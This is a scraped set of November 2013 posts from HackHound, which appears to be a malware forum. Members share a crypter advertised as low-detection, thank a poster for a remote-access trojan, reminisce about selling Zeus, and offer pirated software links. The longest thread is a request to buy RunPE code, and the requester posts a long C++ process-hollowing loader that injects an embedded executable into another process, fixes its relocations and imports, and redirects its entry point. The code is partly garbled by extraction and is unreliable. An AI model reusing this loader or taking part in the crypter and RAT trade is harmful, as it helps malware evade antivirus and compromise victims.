subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,x58,11/6/2013 0:00,"What I would really like to have is a general talking section. I just like talking with nice people about everyday's life and stuff. No IT and PC stuff. Ofc this is an IT forum, but it never hurts to get along with the other guys in tha forumz and know a little bit about them and their personality Actually not a bad idea at all. More like a 'Hound Lounge' or some similar naming for this lounge with as discription ""Want to relax and have a laugh? This is the right place.""",Advanced
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,BullDog,11/6/2013 0:00,"What I would really like to have is a general talking section. I just like talking with nice people about everyday's life and stuff. No IT and PC stuff. Ofc this is an IT forum, but it never hurts to get along with the other guys in tha forumz and know a little bit about them and their personality Actually not a bad idea at all. More like a 'Hound Lounge' or some similar naming for this lounge with as discription ""Want to relax and have a laugh? This is the right place."" What about the subsection Lobby General Discussion that already exists? According to its description (""Talk about anything here."") that's pretty much exactly what you're looking for.",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Hess,11/6/2013 0:00,"It's been off topic a bit , but my answers are always CV alike ! :S And , I had several attempts to make something funny and where people should post crazy stuff which can be from here , or another board or website.",IntelligenceService
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,hero420,11/6/2013 0:00,Check and configure backups. It seems like a common problem. *looks at **** and opensc* oh you are still alive you made up some money yourself selling zeus and its setup lol what a time that was.,Beginner
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,hero420,11/6/2013 0:00,"Actually not a bad idea at all. More like a 'Hound Lounge' or some similar naming for this lounge with as discription ""Want to relax and have a laugh? This is the right place."" I guess that all goes in offtopic. Plus fun and offtopic should be seperate maybe..! Oh and i don't see any public tutorial/guides section anywhere. That is the main reason sometimes to attract quality users.",Beginner
delphi XE5 LIte - Development Software - HackHound,delphi-xe5-lite,Guest_veros_*,11/8/2013 0:00,is there a download link XE5 Delphi Lite?,NULL
delphi XE5 LIte - Development Software - HackHound,delphi-xe5-lite,LeFF,11/9/2013 0:00,http://rutracker.org...c.php?t=4561866 http://nnm.me/blogs/...3476-4176-lite/,Expert
"unCodeRat - (VB6)Client , (C++)Server - Resources - HackHound",uncoderat-vb6client-cserver,kapala,11/11/2013 0:00,thanx a lot for share man,Newbie
Aegiscrypter 4.0 | - Malware Related Tools - HackHound,aegiscrypter-40,PongLenis,11/12/2013 0:00,"Here is the newest Version of Aegis Crpter It works fine, and i don't think it's backdoored, but as always, test it in a VM first. Screen: Spoiler I have to admit haven't tested the detection rate, but it should be around 5/35. SInce it's actually a good crypter and it should last a little longer, I will give out the password only to ""trusted"" members via PM Attached Files AegisCrypter4.0.zip 2.12MB 208 downloads",Banned
Aegiscrypter 4.0 | - Malware Related Tools - HackHound,aegiscrypter-40,Cypher,11/12/2013 0:00,"Nice share man, thanks.... I will check and report if anything fishy is going on when I have some time.",IntermediateMember
"unCodeRat - (VB6)Client , (C++)Server - Resources - HackHound",uncoderat-vb6client-cserver,soulsly,11/12/2013 0:00,where can i get missing codejock ocx?,Newbie
FAQ - Official - Suggestions & Support - HackHound,faq-official,maqubex,11/13/2013 0:00,"dear admin, i started using this forum from 2008 , i think so when carb0n was the administrator of this forum,and we loved that crew a lot, beacuse of the quality of the releases coming here and the work enviornment , the programers existed here at that time where too much brilliant.. a good binary crew a nice market place and much much things more.. but alas things changed and now this forum is a place where people talking about more waste things than ever for eg:java programmers here.. well i couldnt find some one talented like the old ""darkcodersc"" or ""carb0n"" or ""Krihsel"" or ""elitepacker"" , or ""aryan "" etc... the stupid stealer released later was one of the finest product i have ever used then from hh, since it gave the then noobs like us to get a lot more personal profit.. beyond imagination, the slogan of hack hound,""security through insecurity "" is becoming more unmeaning full one as far as time being, but as a positive sense its higly appreciatable to people posting little bit sensible sources here, i am posting this with the most sincere atitude towards this forum, the main point is that people like us have to go these days in tor and bitnet networks for good things and healthy discussions.. hoping that things will change. and wishing all the best for hack hound..D",Banned
HackHound without logo [script] - Suggestions & Support - HackHound,hackhound-without-logo-script,x58,11/14/2013 0:00,"Some people prefer this. Here is a small script that will do the job. Only thing you need is Greasemonkey in Firefox or Chrome. Logo will be replaced by But you can change this to anything if you want. It works on all themes. // ==UserScript== // @name Nologo // @namespace http://userscripts.org // @description Nologo // @include http://www.hackhound.org // @author Nobody // @version 1.0 // ==/UserScript== window.addEventListener('load', function() { var images = document.getElementsByTagName('img'); for (var i = 0; i",Advanced
"unCodeRat - (VB6)Client , (C++)Server - Resources - HackHound",uncoderat-vb6client-cserver,X-SYSTEM,11/14/2013 0:00,Remote Adminstrator Tool unCodeRat Wow i like this ! Euh... can i open the server c++ whit vb c++ ?,Member
[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,0x22,11/14/2013 0:00,"Been trying to code my own RunPE for a long time now but i fail again and agian so ive given up. Ive been reading all there is on MSDN and all over google about dynamic forking, relocation, mapping etc etc.. for weeks *tired* I did code a working one from more or less scratch and it was working flawless until i saw that it would cause a crash 1/10 times without relocation support implemented, it made it unstable which indeed is bad as the most important part is the execution rate. I've also seen that most of these crypters now days (or atleast from the leaked sources ive seen), I've not come across one single one runpe that supports this feature, which really surprised me alot, as this means most of them only got 90% execution rate) I do also have a working 32bit runpe with relocation and everything i need but then again i fail when i try to port it to work on 64bit. If anyone can code one, got a working one, or what ever that can help, as long as the price is right i will buy it Demands: Coded in pure C/C++ Support both reloc and non reloc 32/64bit support Commented code is also perferred Thanks a bunch Have a great day",Advanced
[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,Johannes,11/15/2013 0:00,"http://www.security....de/loadexe.html if you are too stupid to get it working, I am happy to do it for 100 dollar.",Beginner
Useful delphi components - Extra - HackHound,useful-delphi-components,Guest_heraclez_*,11/15/2013 0:00,Thanks,NULL
[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,0x22,11/15/2013 0:00,"yeah this one i already have been trying to port it to wow64 for days, guess im too stupid",Advanced
[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,Johannes,11/15/2013 0:00,"and where is your problem exactly? Start by remove the stupid custom structs with the ""real"" Microsoft structs e.g. SectionHeader - IMAGE_SECTION_HEADER",Beginner
Useful delphi components - Extra - HackHound,useful-delphi-components,BlackHook,11/15/2013 0:00,thanks for share,Newbie
[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,x58,11/15/2013 0:00,Topic moved to market place.,Advanced
"unCodeRat - (VB6)Client , (C++)Server - Resources - HackHound",uncoderat-vb6client-cserver,testacc,11/15/2013 0:00,"I would also like to find the codejock.. If someone has it, please post it. So interested to test this",IntermediateMember
[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,0x22,11/15/2013 0:00,"Thanks for being helpful Johannes, I never used custom headers, the problem is me not grasping the concept fully or something else.. I'm not quite sure anymore... First off i want to thank you for taking your time to look at my problem. First i made this crude attempt to make it work with wow64 and 32 ofcourse. This code presents several problems. First off, it will potentially have two execution paths. One for pure 32 bit and one for wow64. In my opinion this is not the best solution ive seen but its what ive managed. I've probably read everything thats available on MSDN and other sources about the PE file format and the windows loader. I can't say i understand everything but i think i have a good grasp of the consepts. Anyways this code does not work, it definately have a problem with the IAT (import table). This is probably asking more but, obviously im not fully capable of understanding this on my own. My three points i have most trouble understanding is: 1) How to make it 32/64/wow64 compatible (never done this for anything ive ever coded before) 2) Fully understanding base relocation and IAT (I think actually base relocation works?. (see code)) 3) Understanding the different execution paths i have to take, when the file either has equal imagebase as the process or, not equal imagebase but has a .reloc table, or does not have equal imagebase as the process and do not have a .reloc table. Thanks for taking your time to read through this. Best regards This is the current state of my crude attempt: // clanpe.cpp : Defines the entry point for the console application. // #include ""stdafx.h"" #include ""includes.h"" // #include #include #include using std::cout; using std::endl; */ int main(int argc, _TCHAR* argv[]) { HRSRC hrResource = NULL; HGLOBAL hGlobal = NULL; HMODULE hExe = GetModuleHandle(NULL); hrResource = FindResource( hExe, MAKEINTRESOURCE(114), MAKEINTRESOURCE(10) ); hGlobal = LoadResource( hExe, hrResource ); DWORD dwResSize = SizeofResource( hExe, hrResource ); char* cResBuffer = new char[ dwResSize ]; RtlZeroMemory( cResBuffer, dwResSize ); cResBuffer = (char*)LockResource(hGlobal); PIMAGE_DOS_HEADER ExeDOS = (PIMAGE_DOS_HEADER)cResBuffer; if ( ExeDOS-e_magic != IMAGE_DOS_SIGNATURE) { cout e_lfanew); if ( ExeNTH-Signature != IMAGE_NT_SIGNATURE) { cout OptionalHeader.ImageBase OptionalHeader.ImageBase ) { // ImageBase is Equal // ImageBase is Equal } else { // ImageBase is NOT Equal PIMAGE_DATA_DIRECTORY IDD = &ExeNTH-OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; if ( IDD-Size && IDD-VirtualAddress 0 ) { cout OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if ( lpProcMem != NULL) { cout OptionalHeader.SizeOfHeaders, NULL) ) { cout FileHeader.NumberOfSections; i++) { ISH = (PIMAGE_SECTION_HEADER)&cResBuffer[ExeDOS-e_lfanew+sizeof(IMAGE_NT_HEADERS)+sizeof(IMAGE_SECTION_HEADER)*i]; if ( WriteProcessMemory( PINFO.hProcess, &lpProcMem[ ISH-VirtualAddress ], &cResBuffer[ISH-PointerToRawData], ISH-SizeOfRawData, NULL) ) { cout Name Name OptionalHeader.ImageBase; cout OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); if ( ReadProcessMemory( PINFO.hProcess, (LPVOID)PIBR, IBR, sizeof( IMAGE_BASE_RELOCATION ), NULL) ) { cout VirtualAddress0;n++ ) { //Obtain the RelocationBlock char* RelocationBlock = (char*)lpProcMem+IBR-VirtualAddress; //Obtain the first entry in the block LPWORD RelocationEntry = (LPWORD) ((char*)PIBR+sizeof( IMAGE_BASE_RELOCATION )); //loop through all the entries for ( DWORD i = 0; i SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2); i++, RelocationEntry++) { WORD valor; if ( !ReadProcessMemory( PINFO.hProcess, RelocationEntry, &valor, 2, NULL) ) { TerminateProcess( PINFO.hProcess, 0 ); cout 12; //Get the 12 bytes that define the address of the Relocation DWORD offset = valor12; //If the type of relocation is relative to the baseaddress, we add the delta to it if (type == IMAGE_REL_BASED_HIGHLOW) { //Add the address which depends on the original imagebase //from the delta with the imagebase and our base address LPWORD newAddr = (LPWORD)(RelocationBlock+offset); DWORD NewValue = 0; if ( !ReadProcessMemory( PINFO.hProcess, newAddr, &NewValue, 4, NULL) ) { TerminateProcess( PINFO.hProcess, 0 ); cout SizeOfBlock); if ( !ReadProcessMemory( PINFO.hProcess, (LPVOID)PIBR, IBR, sizeof( IMAGE_BASE_RELOCATION ), NULL) ) { TerminateProcess( PINFO.hProcess, 0 ); cout OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size0) { //Obtain the Import Data Descriptor //Copy the Import Data Descriptor from the data in the process to a buffer to work with PIMAGE_IMPORT_DESCRIPTOR IID = (PIMAGE_IMPORT_DESCRIPTOR)GlobalAlloc(GPTR,sizeof(IMAGE_IMPORT_DESCRIPTOR)); PIMAGE_IMPORT_DESCRIPTOR PIID = (PIMAGE_IMPORT_DESCRIPTOR)(lpProcMem+ExeNTH-OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); if ( !ReadProcessMemory( PINFO.hProcess, (LPVOID)PIID, IID, sizeof( IMAGE_IMPORT_DESCRIPTOR ), NULL) ) { TerminateProcess( PINFO.hProcess, 0 ); cout Name;) { //Obtain the address of the dllname DWORD szName=0; CHAR miByte=1; for(int i=0;miByte;i++) { szName=i; ReadProcessMemory(PINFO.hProcess, lpProcMem+IID-Name+i,&miByte,1,0); } //Get the dll name LPSTR lpName=(LPSTR)GlobalAlloc(GPTR,szName+1); ReadProcessMemory(PINFO.hProcess, lpProcMem+IID-Name,lpName,szName+1,0); //Load the Dll HMODULE hLib=LoadLibraryA(lpName); //Get the address of the first member from Image Thunk Data's array PITD=(PIMAGE_THUNK_DATA)((DWORD)lpProcMem+IID-FirstThunk); ITD=(PIMAGE_THUNK_DATA)GlobalAlloc(GPTR,sizeof(IMAGE_THUNK_DATA)); ReadProcessMemory(PINFO.hProcess,PITD,ITD,sizeof(IMAGE_THUNK_DATA),0); //Loop through all the API imports for (;ITD-u1.Ordinal;) { miByte=1; //Obtain the address of the API name for(int i=0;miByte;i++) { szName=i; LPSTR puntero=lpProcMem+ITD-u1.Function+2; puntero+=i; ReadProcessMemory(PINFO.hProcess, puntero,&miByte,1,0); } //Load the Image Import By Name to get the name IBN=(PIMAGE_IMPORT_BY_NAME)GlobalAlloc(GPTR,sizeof(IMAGE_IMPORT_BY_NAME)+sz​Name); ReadProcessMemory(PINFO.hProcess,lpProcMem+ITD-u1.Function,IBN,sizeof(IMAGE_IMPORT_BY_NAME)+szName,0); //Get the address of the function and save it in the IAT DWORD lpAPI=(DWORD)GetProcAddress(hLib,(LPCSTR)&IBN-Name); if ( !WriteProcessMemory( PINFO.hProcess, lpProcMem+ITD-u1.Function, &lpAPI, 4, 0) ) cout u1.Function - Error: "" OptionalHeader.AddressOfEntryPoint; if ( !WriteProcessMemory( PINFO.hProcess, (PVOID)(CONX.Ebx+8), &ExeNTH-OptionalHeader.ImageBase, sizeof(PVOID), NULL ) ) cout OptionalHeader.ImageBase.\nError: "" OptionalHeader.SizeOfHeaders\nError: "" OptionalHeader.SizeOfImage.\nError: """,
